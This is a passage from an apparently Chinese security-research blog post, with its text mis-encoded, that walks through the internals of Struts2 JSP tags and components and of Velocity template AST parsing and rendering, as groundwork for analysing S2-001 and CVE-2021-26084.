class="keyword">this</span>.getBody());</span><br><span class="line">    <span class="keyword">this</span>.component = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Component"><a href="#Component" class="headerlink" title="Component"></a>Component</h4><p>ComponentTagSupport æœ‰ä¸ªå±æ€§Componentã€‚ä»€ä¹ˆæ˜¯Componentï¼Ÿå¯ä»¥ç†è§£ä¸ºTag åˆ°html çš„å®ç°ã€‚Component å’ŒTag åŸºæœ¬æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œæ˜¯ComponentTagSupport#getBean æ¥å£å®šä¹‰çš„å¯¹åº”å…³ç³»ã€‚ä¾‹å¦‚TextFieldTag </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextFieldTag</span> <span class="keyword">extends</span> <span class="title">AbstractUITag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Component <span class="title">getBean</span><span class="params">(ValueStack stack, HttpServletRequest req, HttpServletResponse res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TextField(stack, req, res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-252.png" alt="upload successful"></p><h4 id="UIBean"><a href="#UIBean" class="headerlink" title="UIBean"></a>UIBean</h4><p>UIBean ç»§æ‰¿åŸºç¡€ç±»Componentï¼Œå®ƒçš„evaluateParams æ–¹æ³•å®ç°äº†å¯¹html å…ƒç´ å±æ€§è¿›è¡Œèµ‹å€¼ã€‚è¿™é‡Œæ˜¯S2-001 æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œæœ¬æ–‡ä¸è¿‡å¤šæ‰©å±•ï¼Œåæ–‡å†è¯¦ç»†è·Ÿè¸ªã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">end</span><span class="params">(Writer writer, String body)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.evaluateParams();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.end(writer, body, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">this</span>.mergeTemplate(writer, <span class="keyword">this</span>.buildTemplateName(<span class="keyword">this</span>.template, <span class="keyword">this</span>.getDefaultTemplate()));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        LOG.error(<span class="string">&quot;error when rendering&quot;</span>, var7);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.popComponentStack();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-Velocity"><a href="#0x03-Velocity" class="headerlink" title="0x03 Velocity"></a>0x03 Velocity</h2><p>ä¸JSP ç¼–è¯‘æˆclass ä¸ä¸€æ ·ï¼ŒVelocity æ˜¯å®æ—¶é€šè¿‡ConfluenceVelocityServlet è¿›è¡Œå¤„ç†çš„ã€‚å¤§è‡´è¿‡ç¨‹æ˜¯è§£ææˆASTï¼Œå†è®¡ç®—æ¯ä¸ªASTèŠ‚ç‚¹ã€‚</p><h3 id="3-1-Velocity-Demo"><a href="#3-1-Velocity-Demo" class="headerlink" title="3.1 Velocity Demo"></a>3.1 Velocity Demo</h3><p>èƒŒæ™¯çŸ¥è¯†ä¸è¯¦ç»†å±•å¼€ï¼Œå…·ä½“å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€5ã€‘ï¼Œæˆ–è€…æ–‡æ¡£ã€4ã€‘ã€‚ç›´æ¥çœ‹ä¸ªæœ€åŸºç¡€çš„ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Person.java</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Persion</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">## hello.vm</span><br><span class="line">#set ($iAmVariable=&quot;good!&quot;)</span><br><span class="line">#set ($Person.name=&quot;kkk&quot;)</span><br><span class="line"></span><br><span class="line">Welcome $&#123;name&#125; to velocity.com</span><br><span class="line">today is $&#123;date&#125;.</span><br><span class="line"></span><br><span class="line">#foreach ($&#123;i&#125; in $&#123;list&#125;)</span><br><span class="line">    $&#123;i&#125;</span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line">$&#123;Person.name&#125;</span><br></pre></td></tr></table></figure><!--more--><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># HelloVelocity.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloVelocity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        VelocityEngine ve = <span class="keyword">new</span> VelocityEngine();</span><br><span class="line">        ve.setProperty(RuntimeConstants.RESOURCE_LOADER, <span class="string">&quot;classpath&quot;</span>);</span><br><span class="line">        ve.setProperty(<span class="string">&quot;classpath.resource.loader.class&quot;</span>, ClasspathResourceLoader.class.getName());</span><br><span class="line">        ve.init();</span><br><span class="line">        </span><br><span class="line">        Template t = ve.getTemplate(<span class="string">&quot;hello.vm&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        VelocityContext ctx = <span class="keyword">new</span> VelocityContext();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;velocity&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;date&quot;</span>, (<span class="keyword">new</span> Date()).toString());</span><br><span class="line">        List temp = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        temp.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        temp.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;list&quot;</span>, temp);</span><br><span class="line">        </span><br><span class="line">        Persion persion = <span class="keyword">new</span> Persion();</span><br><span class="line">        ctx.put(<span class="string">&quot;Person&quot;</span>, persion);</span><br><span class="line">        </span><br><span class="line">        StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        t.merge(ctx, sw);</span><br><span class="line">        System.out.println(sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­éœ€è¦é‡ç‚¹å…³æ³¨çš„å‡ ä¸ªæ¦‚å¿µï¼š</p><ul><li>VelocityEngine</li><li>Template æ¨¡æ¿</li><li>Template.merge æ¥å£</li><li>VelocityContext ä¸Šä¸‹æ–‡</li><li>StringWriter</li></ul><h3 id="3-2-åŸç†è§£æ"><a href="#3-2-åŸç†è§£æ" class="headerlink" title="3.2 åŸç†è§£æ"></a>3.2 åŸç†è§£æ</h3><p>Velocity ä¹Ÿå¯ä»¥ç®—æ˜¯ä¸€ç§ä»£ç è¯­è¨€ï¼Œä¹Ÿæ˜¯é€šè¿‡AST æ ‘è¿›è¡Œç¿»è¯‘å’Œæ‰§è¡Œã€‚</p><h4 id="3-2-1-ç”ŸæˆASTæ ‘"><a href="#3-2-1-ç”ŸæˆASTæ ‘" class="headerlink" title="3.2.1 ç”ŸæˆASTæ ‘"></a>3.2.1 ç”ŸæˆASTæ ‘</h4><p>è¿˜æ˜¯ä»¥ä¸Šæ–‡çš„hello.vm ä¸ºä¾‹</p><p><img src="/images/pasted-230.png" alt="upload successful"></p><p>æ¶‰åŠåˆ°çš„AST èŠ‚ç‚¹</p><ul><li>ASTText ï¼šæ–‡æœ¬</li><li>ASTReference ï¼šå¼•ç”¨</li><li>ASTSetDirective set ï¼šSetæŒ‡ä»¤</li><li>ASTDirective ï¼šæŒ‡ä»¤</li><li>ASTWord ï¼šå…³é”®å­—ï¼Ÿ</li><li>ASTBlock ï¼šä»£ç å—ï¼Ÿ</li><li>ASTStringLiteral ï¼šå­—ç¬¦ä¸²</li><li>ASTExpression    ï¼šè¡¨è¾¾å¼</li></ul><p><img src="/images/pasted-229.png" alt="upload successful"></p><p>å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–æ›´å¤šçš„èŠ‚ç‚¹</p><p>å‚è€ƒã€3ã€‘ä¸­æåˆ°4 å¤§ç±»ï¼Œè¿™é‡Œç›´æ¥å¼•ç”¨</p><blockquote><p>Velocityçš„è¯­æ³•ç›¸å¯¹ç®€å•ï¼Œæ‰€ä»¥å®ƒçš„è¯­æ³•èŠ‚ç‚¹å¹¶ä¸æ˜¯å¾ˆå¤šï¼Œæ€»å…±æœ‰50å‡ ä¸ªï¼Œå®ƒä»¬å¯ä»¥åˆ’åˆ†ä¸ºå¦‚ä¸‹å‡ ç§ç±»å‹ã€‚</p></blockquote><ul><li><p>å—èŠ‚ç‚¹ç±»å‹ï¼šä¸»è¦ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªä»£ç å—ï¼Œå®ƒä»¬æœ¬èº«å¹¶ä¸è¡¨ç¤ºæŸä¸ªå…·ä½“çš„è¯­æ³•èŠ‚ç‚¹ï¼Œä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆæ¸²æŸ“è§„åˆ™ã€‚è¿™ç§ç±»å‹çš„èŠ‚ç‚¹ä¸»è¦ç”±ASTReferenceã€ASTBlockå’ŒASTExpressionç­‰ç»„æˆã€‚</p></li><li><p>æ‰©å±•èŠ‚ç‚¹ç±»å‹ï¼šè¿™äº›èŠ‚ç‚¹å¯ä»¥è¢«æ‰©å±•ï¼Œå¯ä»¥è‡ªå·±å»å®ç°ï¼Œå¦‚æˆ‘ä»¬ä¸Šé¢æåˆ°çš„#foreachï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªæ‰©å±•ç±»å‹çš„ASTDirectiveèŠ‚ç‚¹ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥è‡ªå·±å†æ‰©å±•ä¸€ä¸ªASTDirectiveç±»å‹çš„èŠ‚ç‚¹ã€‚</p></li><li><p>ä¸­é—´èŠ‚ç‚¹ç±»å‹ï¼šä½äºæ ‘çš„ä¸­é—´ï¼Œå®ƒçš„ä¸‹é¢æœ‰å­èŠ‚ç‚¹ï¼Œå®ƒçš„æ¸²æŸ“ä¾èµ–äºå­èŠ‚ç‚¹æ‰èƒ½å®Œæˆï¼Œå¦‚ASTIfStatementå’ŒASTSetDirectiveç­‰ã€‚</p></li><li><p>å¶å­èŠ‚ç‚¹ï¼šå®ƒä½äºæ ‘çš„å¶å­ä¸Šï¼Œæ²¡æœ‰å­èŠ‚ç‚¹ï¼Œè¿™ç§ç±»å‹çš„èŠ‚ç‚¹è¦ä¹ˆç›´æ¥è¾“å‡ºå€¼ï¼Œè¦ä¹ˆå†™åˆ°writerä¸­ï¼Œå¦‚ASTTextå’ŒASTTrueç­‰ã€‚</p></li></ul><h5 id="Directive"><a href="#Directive" class="headerlink" title="Directive"></a>Directive</h5><p>è¿™é‡Œå±•å¼€è®²è®²æ‰©å±•èŠ‚ç‚¹ï¼Œvelocityé»˜è®¤å†…ç½®çš„Directiveæœ‰ä»¥ä¸‹</p><p><img src="/images/pasted-231.png" alt="upload successful"></p><p>åœ¨Strutsä¸­ï¼Œæœ‰æ›´å¤šçš„Directive</p><p><img src="/images/pasted-232.png" alt="upload successful"></p><p>åœ¨Confluenceä¸­ï¼Œæœ‰BodyTag/Tag/Param æŒ‡ä»¤ï¼ŒTag çš„å®ç°æ˜¯CVE-2021-26084 Ognlæ³¨å…¥æ¼æ´çš„åŸå› ã€‚</p><p><img src="/images/pasted-233.png" alt="upload successful"></p><h4 id="3-2-2-æ‰§è¡ŒAST"><a href="#3-2-2-æ‰§è¡ŒAST" class="headerlink" title="3.2.2 æ‰§è¡ŒAST"></a>3.2.2 æ‰§è¡ŒAST</h4><p>ä¸Ognl çš„SimpleNode.getValueBody æ¥å£ç±»ä¼¼ï¼ŒVelocity çš„æ¥å£ä¸ºSimpleNode.render/value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># SimpleNode.java</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">render</span><span class="params">( InternalContextAdapter context, Writer writer)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> IOException, MethodInvocationException, ParseErrorException, ResourceNotFoundException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> i, k = jjtGetNumChildren();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">           jjtGetChild(i).render(context, writer);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¸ªåŒºåˆ«ï¼Œä¸Ognlä¸åŒï¼Œresultä¸ä¼šä½œä¸ºå‰ä¸€ä¸ªçš„å‚æ•°ã€‚</p><h5 id="ASTSetDirective"><a href="#ASTSetDirective" class="headerlink" title="ASTSetDirective"></a>ASTSetDirective</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">render</span><span class="params">( InternalContextAdapter context, Writer writer)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException, MethodInvocationException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"><span class="comment">// è·å–å³è¾¹èŠ‚ç‚¹çš„å€¼</span></span><br><span class="line">      Object value = right.value(context);</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">// å¦‚æœå·¦è¾¹èŠ‚ç‚¹æ˜¯ä¸ªæ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆç›´æ¥æ”¾åœ¨contexté‡Œé¢</span></span><br><span class="line">          <span class="keyword">if</span> (left.jjtGetNumChildren() == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              context.put( leftReference, value);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// å¦åˆ™ï¼Œä¼šä½¿ç”¨å…¶ä»–æ–¹å¼ï¼ˆä¾‹å­ä¸­çš„Person æœ€ç»ˆä½¿ç”¨Person.setName invokeå®ç°)</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">              left.setValue(context, value);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><h5 id="ASTReference"><a href="#ASTReference" class="headerlink" title="ASTReference"></a>ASTReference</h5><p>å¼•ç”¨ï¼Œå‡ ä¸ªé‡è¦çš„æ­¥éª¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ASTReference#render</span><br><span class="line">value = execute(<span class="keyword">null</span>, context);</span><br><span class="line"></span><br><span class="line"># ASTReference#execute</span><br><span class="line">Object result = getVariableValue(context, rootString);</span><br></pre></td></tr></table></figure><h5 id="ASTStringLiteral"><a href="#ASTStringLiteral" class="headerlink" title="ASTStringLiteral"></a>ASTStringLiteral</h5><p>éœ€è¦æ³¨æ„å•åŒå¼•å·çš„åŒºåˆ«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set( $foo &#x3D; &quot;bar&quot;)</span><br><span class="line">#set( $foo1 &#x3D; &quot;$foo&quot;)</span><br><span class="line">#set( $foo2 &#x3D; &#39;$foo&#39;)</span><br><span class="line">#set( $foo3 &#x3D; $foo)</span><br><span class="line">$foo</span><br><span class="line">$foo1</span><br><span class="line">$foo2</span><br><span class="line">$foo3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bar</span><br><span class="line">bar</span><br><span class="line">$foo</span><br><span class="line">bar</span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥çœ‹åˆ°ï¼Œé»˜è®¤æƒ…å†µå•å¼•å·ä¸è§£æVelocityä¸­çš„å¯ç”¨å˜é‡ã€‚å¯ä»¥é€šè¿‡æ”¹å˜velocity.properties ä¸­çš„stringliterals.interpolate=falseé…ç½®æ¥æ”¹å˜è¿™ç§é»˜è®¤è®¾ç½®ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">boolean</span> interpolate = <span class="keyword">true</span>;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">init</span><span class="params">(InternalContextAdapter context, Object data)</span> <span class="keyword">throws</span> TemplateInitException</span>&#123;</span><br><span class="line">...</span><br><span class="line">       interpolate = rsvc.getBoolean(</span><br><span class="line">               RuntimeConstants.INTERPOLATE_STRINGLITERALS, <span class="keyword">true</span>)</span><br><span class="line">               &amp;&amp; getFirstToken().image.startsWith(<span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">               &amp;&amp; ((getFirstToken().image.indexOf(<span class="string">&#x27;$&#x27;</span>) != -<span class="number">1</span>) || (getFirstToken().image</span><br><span class="line">                       .indexOf(<span class="string">&#x27;#&#x27;</span>) != -<span class="number">1</span>));</span><br></pre></td></tr></table></figure><h5 id="ASTDirective"><a href="#ASTDirective" class="headerlink" title="ASTDirective"></a>ASTDirective</h5><p>ASTSetDirective åç§°ä¸Šå¯èƒ½æƒ³å½“ç„¶ç»§æ‰¿ASTDirectiveï¼Œä½†æ˜¯å¹¶éå¦‚æ­¤ã€‚ASTDirective æœ‰ä¸¤ä¸ªå±æ€§</p><ul><li>directive            ä¸ºDirectiveç±»å‹ï¼Œä¹Ÿå°±æ˜¯å‰æ–‡è®²åˆ°çš„å„ç§æ‰©å±•èŠ‚ç‚¹</li><li>directiveName        </li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASTDirective</span> <span class="keyword">extends</span> <span class="title">SimpleNode</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Directive directive = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String directiveName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">render</span><span class="params">( InternalContextAdapter context, Writer writer)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException,MethodInvocationException, ResourceNotFoundException, ParseErrorException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">            directive.render(context, writer, <span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>ASTDirective çš„render æ¥å£å®é™…è°ƒç”¨çš„æ˜¯directive çš„renderï¼Œå…·ä½“çš„é€»è¾‘åœ¨æ¯ä¸ªDirective å®ç°ç±»é‡Œé¢ã€‚</p><h3 id="3-3-Struts2-ä¸‹çš„Velocity"><a href="#3-3-Struts2-ä¸‹çš„Velocity" class="headerlink" title="3.3 Struts2 ä¸‹çš„Velocity"></a>3.3 Struts2 ä¸‹çš„Velocity</h3><p>å‡ ä¸ªå…³é”®çš„VelocityåŒ…</p><ol><li><p>velocity            æ ¸å¿ƒ</p></li><li><p>velocity-tools    å’Œwebç›¸å…³çš„ä¸€äº›æ”¯æŒ</p></li><li><p>struts-core        æœ‰å†…ç½®velocityçš„ä¸€äº›æ”¯æŒ</p><p> åœ¨org.apache.struts2.views.velocity ç›®å½•ä¸‹</p><ul><li>components            å„ç§Directive æŒ‡ä»¤æ”¯æŒï¼Œä¾‹å¦‚form</li><li>StrutsResourceLoader</li><li>StrutsVelocityContext</li><li>VelocityManager</li></ul></li></ol><h4 id="VelocityManager"><a href="#VelocityManager" class="headerlink" title="VelocityManager"></a>VelocityManager</h4><p>è´Ÿè´£Velocity çš„ç¯å¢ƒå‡†å¤‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VelocityManager</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> VelocityEngine velocityEngine;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> String[] chainedContextNames;</span><br><span class="line">    <span class="keyword">private</span> Properties velocityProperties;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// ç”Ÿæˆ StrutsVelocityContext</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Context <span class="title">createContext</span><span class="params">(ValueStack stack, HttpServletRequest req, HttpServletResponse res)</span> </span>&#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="StrutsVelocityContext"><a href="#StrutsVelocityContext" class="headerlink" title="StrutsVelocityContext"></a>StrutsVelocityContext</h4><p>StrutsVelocityContext ç»§æ‰¿VelocityContextï¼Œä¸”é‡å†™äº†internalGet å€Ÿå£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StrutsVelocityContext</span> <span class="keyword">extends</span> <span class="title">VelocityContext</span> </span>&#123;</span><br><span class="line">ValueStack stack;</span><br><span class="line">VelocityContext[] chainedContexts;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">internalGet</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å…ˆä»çˆ¶ç±»çš„VelocityContext çš„Contexté‡Œå°è¯•è·å–</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">super</span>.internalContainsKey(key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.internalGet(key);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// æ¥ç€ä»struts2 çš„stacké‡ŒfindValue è·å–</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.stack != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object object = <span class="keyword">this</span>.stack.findValue(key);</span><br><span class="line">                <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">// å†å°è¯•ä»stack çš„contexté‡Œè·å–</span></span><br><span class="line">                object = <span class="keyword">this</span>.stack.getContext().get(key);</span><br><span class="line">                <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ€åä»VelocityContext æ•°ç»„è·å–</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.chainedContexts != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="keyword">this</span>.chainedContexts.length; ++index) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.chainedContexts[index].containsKey(key)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">this</span>.chainedContexts[index].internalGet(key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-æ€»ç»“ä¸æ€è€ƒ"><a href="#0x04-æ€»ç»“ä¸æ€è€ƒ" class="headerlink" title="0x04 æ€»ç»“ä¸æ€è€ƒ"></a>0x04 æ€»ç»“ä¸æ€è€ƒ</h2><p>æœ¬æ–‡ç®€è¦åˆ†æäº†JSP çš„æ‰§è¡Œé€»è¾‘ï¼Œé¦–å…ˆç¼–è¯‘æˆclassï¼Œå…¶ä¸­ä¼šå°†jsp è¯­å¥åˆ†è§£æˆå„ç§Tagï¼ŒTag äº¤ç”±Component è¿›è¡Œè½¬åŒ–æˆå®é™…çš„html å­—ç¬¦ã€‚</p><p>æ¥ä¸‹æ¥è·Ÿè¸ªäº†Velocity ASTè§£æä¸æ‰§è¡Œçš„æµç¨‹ï¼Œé€‰å–äº†å‡ ä¸ªå¸¸è§çš„AST Node è·Ÿè¸ªã€‚æ²¡æœ‰ä»€ä¹ˆæ–°ä¸œè¥¿ï¼Œåªæ˜¯ä¸ºä»¥åæ¼æ´åˆ†æåšå‡†å¤‡ã€‚</p><p>è¿™äº›éƒ½æ˜¯struts2 